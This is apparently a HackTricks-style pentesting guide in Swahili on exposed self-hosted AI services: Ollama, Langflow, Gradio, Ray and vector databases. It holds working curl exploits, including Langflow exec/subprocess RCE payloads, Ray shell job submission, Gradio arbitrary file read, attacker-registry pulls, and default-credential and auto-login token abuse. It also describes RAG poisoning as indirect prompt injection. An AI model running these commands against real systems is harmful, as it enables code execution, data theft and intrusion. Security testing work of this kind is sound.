# Huduma za AI Zinazojiendesha Zilizowekwa Hadharani

{{#include ../banners/hacktricks-training.md}}

Timu zinazounda vipengele vya AI mara nyingi huendesha wenyewe viendesha modeli, wajenzi wa mawakala, UI za maonyesho, vikundi vya compute na hifadhidata za vekta. Nyingi ya zana hizi ziliundwa kwa matumizi kwenye laptop au mtandao wa maabara uliofungwa, kwa hiyo **hazina uthibitishaji kwa chaguo-msingi** au huja zikiwa na njia ya mkato ya uthibitishaji iliyowezeshwa. Mshambuliaji anapoweza kufikia huduma kama hiyo, athari kwa kawaida huangukia katika mojawapo ya makundi haya:

- Matumizi ya bure ya GPUs na modeli, na wizi wa modeli za faragha.
- Kuvuja kwa prompts, hati na embeddings.
- Kuvuja kwa siri kutoka kwenye mazingira ya mchakato (funguo za watoa huduma wa LLM, vitambulisho vya cloud).
- Utekelezaji wa msimbo, kwa sababu baadhi ya API hizi huendesha msimbo **kama kipengele**.

Ukurasa huu unaeleza jinsi ya kupata huduma hizi na mambo ya kupima kwenye kila aina ya API. Kwa kuimarisha seva ya inference inayojiendesha na leak ya llama.cpp `/slots`, angalia [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Kwa faili hasidi za modeli, angalia [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Tuma maombi haya bila credentials. Jibu la JSON lenye sehemu zinazotarajiwa hutambua bidhaa, na mara nyingi toleo lake, ambalo hukuambia ukaguzi upi kati ya ulio hapa chini unatumika. Port ni zile za chaguo-msingi zilizoandikwa au zilizotumika kwenye mifano rasmi ya kuendesha.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Bidhaa | Port ya kawaida | Ombi lisilohitaji uthibitishaji | Kinachoitambulisha |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON ya toleo, orodha ya modeli za ndani |
| Langflow | 7860 | `GET /api/v1/version` | JSON ya toleo la Langflow |
| Gradio | 7860 | `GET /config` | Mipangilio ya app yenye toleo la Gradio na vitambulisho vya vipengele |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, orodha ya jobs zilizowasilishwa |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Thamani ya heartbeat, toleo la Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Toleo la Qdrant, orodha ya collections |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Toleo la Weaviate, madarasa |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Orodha ya collections, au hitilafu ya uthibitishaji |

Huduma hizi pia mara nyingi huchapishwa nyuma ya reverse proxy chini ya kiambishi awali cha njia (kwa mfano `/ollama/` au `/ray/`), kwa hiyo rudia maombi chini ya kiambishi awali chochote kilichopatikana kwenye vifurushi vya JavaScript au nyaraka za API.

## API za inference na usimamizi wa modeli zisizohitaji uthibitishaji

Viendesha modeli kwa kawaida hufichua API moja ya REST inayochanganya njia za inference na njia za usimamizi. Ollama ni mfano mzuri. Haina uthibitishaji uliojengewa ndani na kwa chaguo-msingi hufungamana na `127.0.0.1:11434`, huku `OLLAMA_HOST` ikibadilisha anwani ya bind.<sup>[[1]](#references)[[15]](#references)</sup> Image rasmi ya Docker huweka `OLLAMA_HOST=0.0.0.0:11434` ndani ya container, hutangaza `EXPOSE 11434` na haina maagizo ya `USER`, kwa hiyo seva huendeshwa kama root ndani ya container.<sup>[[16]](#references)</sup> `EXPOSE` haichapishi port kwenye host, kwa hiyo ufikikaji kutoka host hutegemea deployment. Amri za `docker run` zilizoandikwa hutumia `-p 11434:11434`, na Docker huchapisha mapping kama hiyo kwenye interfaces zote za host isipokuwa IP ya host itolewe.<sup>[[17]](#references)[[18]](#references)</sup>

Kila kundi la njia humpa mshambuliaji nini:<sup>[[2]](#references)</sup>

| Njia | Athari zisipohitaji uthibitishaji |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Orodha ya modeli za ndani na zilizopakiwa, zikiwemo modeli maalum za faragha |
| `POST /api/show` | Maelezo ya modeli, yakiwemo Modelfile, template na **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inference ya bure kwenye hardware ya mwathiriwa |
| `POST /api/pull`, `POST /api/push` | Kuifanya seva ipakue kutoka, au ipakie modeli kwenye, registry iliyochaguliwa na mshambuliaji |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Kuunda, kubatilisha au kufuta modeli |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Orodha ya modeli iliyorejeshwa bila credentials tayari inathibitisha kuwepo kwa exposure. Modeli maalum mara nyingi huwa na system prompt ya ndani katika `/api/show`. Pull inayoelekezwa kwenye host yako inathibitisha kwamba server hupakua manifests kutoka kwa registries zilizochaguliwa na mshambuliaji. `/api/push` inayoelekezwa kwenye registry yako hugeuza exposure hiyo kuwa wizi wa modeli. Usitumie routes za create au delete kwenye targets halisi.

Registry pulls pia ni sehemu ya mashambulizi ya parser, kwa sababu server huhifadhi blobs kwa kutumia thamani kutoka kwenye manifest ya mbali. Katika Probllama (CVE-2024-37032, ilirekebishwa katika Ollama 0.1.34), `digest` ya manifest ilitumika kama jina la faili bila uthibitishaji. Kwa hiyo, registry hasidi ingeweza kuandika faili nje ya directory ya blobs kwa kutumia mfuatano wa `../`. Kusukuma manifest iliyopandikizwa, ambayo digest yake ilielekeza kwenye faili la ndani, kulivuja faili hilo kwenye registry ya mshambuliaji. Wiz ilipata RCE katika Docker, ambako server huendeshwa kama root, kwa kuandika shared library na kuiongeza kwenye `/etc/ld.so.preload`, kisha kuita `/api/chat` ili mchakato mpya uipakie.<sup>[[15]](#references)</sup> Runner inapoweza kupakua kutoka kwa registries zisizo na kikomo, chunguza jinsi inavyogeuza sehemu za manifest kuwa paths.

## APIs zinazotekeleza code kwa muundo wake

Vinavyohusiana: [Flowise: ubatilishaji wa workflow-code kwa kila ombi](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise).

### APIs za kutuma kazi

Distributed compute frameworks huchukulia utekelezaji wa code kuwa kipengele chake kikuu. Ray Jobs API kwenye dashboard port (8265) hupokea amri ya shell ya `entrypoint` na kuiendesha kwenye cluster.<sup>[[19]](#references)</sup> Utafiti wa Oligo ShadowRay unaripoti kwamba Jobs API haina authorization na kwamba dashboard hufungamana na `0.0.0.0`. CVE-2023-48022 inayohusiana nayo inabishaniwa kwa sababu Ray inatarajia kuendeshwa tu ndani ya mtandao unaodhibitiwa.<sup>[[20]](#references)</sup> Ray iliongeza uthibitishaji wa tokeni wa hiari (`RAY_AUTH_MODE=token`) katika 2.52.0. Ray 2.59 huiwezesha kwa chaguomsingi kwa local clusters zinazoanzishwa kwa `ray.init()`; `ray start --head` bado inaweza kuanza bila uthibitishaji ikiwa tokeni haipatikani. Ray inaandika kuhusu upanuzi mpana zaidi wa uthibitishaji wa chaguomsingi katika 2.61, kwa hiyo angalia toleo lililosakinishwa na namna ya kuanzisha badala ya kudhani dashboard iko wazi.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashibodi za aina hii pia huwa na routes saidizi zinazofaa kuchunguzwa kwenye matoleo ya zamani. Kabla ya Ray 2.8.1, `/log_proxy?url=` ilichukua URL yoyote ya HTTP(S) (SSRF hadi cloud metadata), na `/api/v0/logs/file` ilikubali path yoyote ya `filename`, bila uthibitishaji katika hali zote mbili.<sup>[[8]](#references)</sup>

### Endpoints za "validation" ya code zinazoendesha ufafanuzi wa function

Wajenzi wa agent wanaokubali vipengele maalum vya Python wakati mwingine "huthibitisha" code kwa kuichanganua kwa kutumia `ast` na kuendesha ufafanuzi wa function pekee kwa `exec()`. Hii si salama. Python hutathmini **decorators na thamani za default za argument wakati wa kufafanua function**, kwa hivyo code iliyowekwa hapo huendeshwa hata kama body ya function haitekelezwi kamwe. `POST /api/v1/validate/code` ya Langflow ilifanya kazi kwa njia hii, na haikuhitaji uthibitishaji kabla ya 1.3.0 (CVE-2025-3248). Kuinua exception yenye matokeo ya command husababisha endpoint kurudisha matokeo hayo kwenye response:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Jaribu endpoint yoyote inayokusanya, kukagua sintaksia au “kuhakiki” code ya mtumiaji ili kutafuta muundo huu, na upendelee kutumia DNS callback kama uthibitisho.

### Njia za auto-login na token ya superuser chaguomsingi

Zana za mtumiaji mmoja mara nyingi huja na njia ya mkato inayomuingiza kila mgeni kama msimamizi. Katika Langflow, `GET /api/v1/auto_login` hurejesha token za superuser chaguomsingi kwa mpigaji yeyote ikiwa `AUTO_LOGIN` imewashwa. Ikiwa imezimwa, njia hiyo hujibu `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 hadi 1.10.0 iliwasha kipengele hiki kwa chaguomsingi (CVE-2026-9103). Kukichanganya na njia ya uthibitishaji wa code inayohitaji uthibitishaji iliyoelezwa hapo juu hurejesha RCE isiyohitaji uthibitishaji (CVE-2026-9198, iliyoripotiwa na Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Vifurushi rasmi vya matoleo ya sasa na picha za Docker huzima auto-login na huhitaji nenosiri la superuser, lakini matawi ya maendeleo huiwasha.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Hata bila utekelezaji wa code, token ya superuser hutoa ufikiaji wa kila flow na credentials zilizohifadhiwa za provider. Kwa ukaguzi unaohusiana wa sharti la awali katika majaribio ya kiotomatiki, tazama [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Routes za kuhudumia faili na RPC katika UI za demo za ML

Frameworks za demo za ML huhudumia faili zilizopakiwa na zinazozalishwa kupitia route ya jumla na kuruhusu frontend kuita helper za component za upande wa server. Gradio hufichua `/config`, `/upload` na `/file=<path>` kwa hili.<sup>[[5]](#references)</sup> Kuna mifumo miwili inayofaa kuijaribu kwenye framework yoyote inayofanana:

- **Traversal kutoka kwenye subdirectory ya upload:** ikiwa route ya faili hukagua tu kwamba path inaanzia ndani ya folder ya muda, pakia faili ili kuunda subdirectory, kisha toka humo kwa kutumia `../` au `%2e%2e%2f`. Gradio 4.0 hadi 4.10 (CVE-2023-51449) ilikuwa na udhaifu huu.<sup>[[26]](#references)[[27]](#references)</sup> Tuma ombi kwa `curl --path-as-is` ili client isirekebishe path.
- **Uelekezaji wa method kiholela:** endpoint inayoita `getattr(component, fn_name)` kwa kutumia ingizo la mtumiaji humruhusu mshambuliaji kuita helper za ndani. Kabla ya 4.13.0, `/component_server` ya Gradio ilifanya hivi. Katika 4.3 hadi 4.12, `move_resource_to_block_cache` ilinakili faili yoyote ya ndani hadi kwenye cache, ambako `/file=` ingeweza kuipakua. Katika 3.47 hadi 3.50.2, helper nyingine ziliruhusu kusoma faili na SSRF ya kusoma maudhui yote.<sup>[[26]](#references)[[28]](#references)</sup> Server iliyorekebishwa hujibu `Function not found.` kwa helper ambazo hazijawekewa alama kama server functions.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Kwenye Hugging Face Spaces, siri za Space ni environment variables, kwa hiyo `/proc/self/environ` ndiyo faili yenye thamani zaidi. Horizon3 iliisoma kwa kutumia HTTP `Range` header.<sup>[[26]](#references)</sup>

## Hifadhidata za vekta zinazotumiwa na RAG

RAG huhifadhi chunks za nyaraka asili, embeddings zake na metadata kwenye hifadhidata ya vekta, kisha msaidizi huweka matokeo ya juu zaidi kwenye prompt yake. Kwa hiyo, ufikiaji wa kusoma husababisha **leak ya maandishi ya kawaida ya nyaraka za faragha**. Ufikiaji wa kuandika humwezesha mshambulizi kuingiza chunks ambazo baadaye huletwa kwenye prompt za watumiaji wengine; hii ni persistent indirect prompt injection (tazama [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Kwa hifadhidata za vekta zinazojihifadhiwa kwenye seva binafsi, angalia kama uthibitishaji umewekwa au kama ufikiaji usiojulikana umewezeshwa:

- **Qdrant**: matukio yaliyosakinishwa binafsi husikiliza kwenye interfaces zote bila uthibitishaji. Ikiwekwa, ufunguo huwekwa kwenye header ya `api-key` au kama `Authorization: Bearer`. Funguo za kusoma pekee na za kila collection zinaweza kuwepo.<sup>[[11]](#references)</sup>
- **Chroma**: uthibitishaji umezimwa kwa chaguomsingi. Uthibitishaji wa token hutumia `Authorization` au `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: ufikiaji usiojulikana ukiwa umewezeshwa, maombi yasiyo na credentials huthibitishwa kama `user: anonymous`, na hupata ruhusa zozote alizonazo mtumiaji huyo.<sup>[[30]](#references)</sup>
- **Milvus**: uthibitishaji umezimwa isipokuwa `common.security.authorizationEnabled` iwe `true`. Ukiwezeshwa, mtumiaji chaguomsingi `root` ana nenosiri `Milvus`, na muundo wa token ni `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Jibu lenye data ya faragha bila credentials linaashiria ufichuaji. Uthibitishaji ukiwa umewezeshwa, tathmini kando akaunti yoyote chaguomsingi ambayo haijabadilishwa:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Angalia kama payloads zina maandishi ya hati, vitambulisho vya watumiaji au majina ya tenant. Ili kuonyesha uwezo wa kuandika bila kuharibu data ya production, unda na ufute mara moja collection tupu yenye jina lililo wazi, na ufanye hivyo tu pale scope inaporuhusu.

Authentication kwenye seva hizi pia inaweza kufanyika ikiwa imechelewa. Kwenye seva ya Python FastAPI ya Chroma (1.0.0 hadi angalau 1.5.8, CVE-2026-45829), route ya kuunda collection iliunda embedding function iliyotolewa na client kabla ya ukaguzi wa authentication. Configuration iliyorejelea model ya Hugging Face inayodhibitiwa na mshambuliaji, ikiwa na `trust_remote_code: true`, iliendesha code ya mshambuliaji hata ombi lilipokataliwa. Rust frontend haikuathirika.<sup>[[32]](#references)</sup> Ombi linapokuwa na configuration ya model au plugin, lijaribu bila credentials na uangalie kama kuna fetch ya nje kwenda kwenye repository ya model yako.

## References

- [1] [Maswali Yanayoulizwa Mara kwa Mara kuhusu Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Nyaraka za Ollama API](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README ya Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Source ya Langflow - endpoints za API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Source ya Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Source ya Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Source ya Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, matoleo ya 2.6.3 na 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Source ya Chroma - chaguo-msingi za Python client](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Source ya Chroma - routes za seva ya FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Usalama](https://qdrant.tech/documentation/security/)
- [12] [Maelezo ya OpenAPI ya Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Maelezo ya OpenAPI ya Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Kuunganisha kwenye Seva ya Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Athari ya Ollama ya Remote Code Execution (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile ya Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Nyaraka za Docker za Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Kuchapisha na kufichua ports](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Kampeni ya Kwanza Inayojulikana ya Mashambulizi Yanayolenga AI Workloads na Kutumia Udhaifu Huo Hadharani](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Authentication ya token ya Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Si Salama kwa Kasi Yoyote: Kutumia Python Exec kwa RCE Isiyohitaji Authentication katika Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Source ya Langflow - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Kutumia Athari za Kusoma Faili katika Gradio Kuiba Siri kutoka Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Taarifa ya usalama ya Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit ya kurekebisha `/component_server` ya Gradio](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Authentication asili ya Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Authentication](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Kuthibitisha Ufikiaji wa Mtumiaji](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast Ilihudumiwa Kabla ya Authentication](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Taarifa ya Usalama ya IBM - Remote Code Execution Isiyohitaji Authentication kupitia Kupita Ulinzi wa Auto-Login na Uthibitishaji wa Code (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
